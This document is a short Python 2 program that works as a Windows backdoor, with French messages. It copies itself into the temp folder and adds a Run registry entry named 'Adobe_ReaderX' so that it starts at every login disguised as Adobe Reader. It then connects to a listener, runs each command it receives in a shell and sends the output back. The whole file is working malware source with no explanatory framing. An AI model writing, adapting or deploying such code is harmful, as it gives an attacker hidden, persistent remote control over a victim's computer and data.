import socket
import subprocess
import sys
import os
from _winreg import *

def percistance (tempdir, fileName, run):
    # Copy executable to %TEMP%:
    os.system('copy %s %s'%(fileName, tempdir))
    path = os.environ["TEMP"]
# Queries Windows registry for key values
# Appends autorun key to runkey array
    key = OpenKey(HKEY_CURRENT_USER,'Software\Microsoft\Windows\CurrentVersion\Run')
    runkey =[]
    try:
        i = 0
        while True:
            subkey = EnumValue(key, i)
            runkey.append(subkey[0])
            i += 1
    except WindowsError:
        pass

# Set autorun key:
    try:
        key= OpenKey(HKEY_CURRENT_USER, run,0,KEY_ALL_ACCESS)
        SetValueEx(key,'Adobe_ReaderX',0,REG_SZ,path+"\client.exe")
        key.Close()
    except WindowsError:
        pass

def Connect():

    host = "localhost"
    port = 1234
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    while True:

        commande =  sock.recv(1024)

        if 'quitter' in commande:
            print 'Fermeture de la connexion'
            sock.close()
            break

        else:

            shell =  subprocess.Popen(commande, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            sock.send(shell.stdout.read() + shell.stderr.read())

def Main ():
    tempdir = os.environ["TEMP"]
    fileName = sys.argv[0]
    run = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    percistance(tempdir, fileName, run)
    Connect()
Main()
